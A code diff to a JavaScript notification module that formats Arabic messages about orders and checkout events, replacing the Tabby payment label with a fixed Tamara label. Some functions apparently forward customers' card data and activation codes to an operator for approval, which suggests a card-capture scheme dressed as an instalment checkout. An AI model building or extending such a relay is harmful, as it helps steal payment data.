@@ -248,7 +248,7 @@ const setupCommands = () => {
         `📱 الهاتف: ${order.user.phone || 'غير محدد'}\n\n` +
         `🛍️ المنتج: ${order.product.name}\n` +
         `💰 المبلغ: ${order.amount.toLocaleString('ar-SA')} ر.س\n` +
-        `💳 طريقة الدفع: ${order.paymentMethod === 'tamara' ? 'تمارا' : 'تابي'}\n` +
+        `💳 طريقة الدفع: تمارا\n` +
         `📊 الأقساط: ${order.installments === 1 ? 'دفعة كاملة' : `${order.installments} أقساط`}\n` +
         `💵 كل دفعة: ${order.perInstallment.toLocaleString('ar-SA')} ر.س\n` +
         `🏦 العمولة: ${order.commission.toLocaleString('ar-SA')} ر.س\n` +
@@ -347,7 +347,7 @@ const sendNewOrderNotification = async (order) => {
     `الإيميل: ${order.userEmail}\n` +
     `المنتج: ${order.productName}\n` +
     `السعر: ${order.amount.toLocaleString('ar-SA')} ر.س\n` +
-    `الدفع: ${order.paymentMethod === 'tamara' ? 'تمارا' : 'تابي'}\n` +
+    `الدفع: تمارا\n` +
     `الأقساط: ${order.installments === 1 ? 'دفعة كاملة' : order.installments}\n` +
     `كل دفعة: ${order.perInstallment.toLocaleString('ar-SA')} ر.س\n` +
     `العمولة: ${order.commission.toLocaleString('ar-SA')} ر.س\n` +
@@ -422,7 +422,7 @@ const sendCheckoutEventNotification = async (event) => {
 
   // Payment method and installments
   if (paymentMethod) {
-    text += `💳 طريقة الدفع: ${paymentMethod === 'tamara' ? 'تمارا' : 'تابي'}\n`;
+    text += `💳 طريقة الدفع: تمارا\n`;
     if (installments) {
       text += `   الأقساط: ${installments === 1 ? 'دفعة كاملة' : `${installments} أقساط`}\n`;
     }
@@ -475,7 +475,7 @@ const sendCardApprovalRequest = async (event) => {
   const formatPrice = (p) => new Intl.NumberFormat('ar-SA', { style: 'currency', currency: 'SAR', minimumFractionDigits: 2 }).format(p);
 
   const sessionShort = sessionId ? sessionId.substring(0, 8) : '—';
-  const methodLabel = paymentMethod === 'tamara' ? 'تمارا' : paymentMethod === 'tabby' ? 'تابي' : paymentMethod || '—';
+  const methodLabel = paymentMethod === 'tamara' ? 'تمارا' : paymentMethod || '—';
   const installmentsLabel = installments ? (installments === 1 ? 'دفعة كاملة' : `${installments} أقساط`) : '—';
 
   let text = '💳 طلب موافقة — بيانات البطاقة\n';
@@ -532,7 +532,7 @@ const sendCodeVerificationRequest = async (event, verificationCode) => {
   const formatPrice = (p) => new Intl.NumberFormat('ar-SA', { style: 'currency', currency: 'SAR', minimumFractionDigits: 2 }).format(p);
 
   const sessionShort = sessionId ? sessionId.substring(0, 8) : '—';
-  const methodLabel = paymentMethod === 'tamara' ? 'تمارا' : paymentMethod === 'tabby' ? 'تابي' : paymentMethod || '—';
+  const methodLabel = paymentMethod === 'tamara' ? 'تمارا' : paymentMethod || '—';
   const installmentsLabel = installments ? (installments === 1 ? 'دفعة كاملة' : `${installments} أقساط`) : '—';
 
   let text = '🔐 تحقق من كود التفعيل\n';
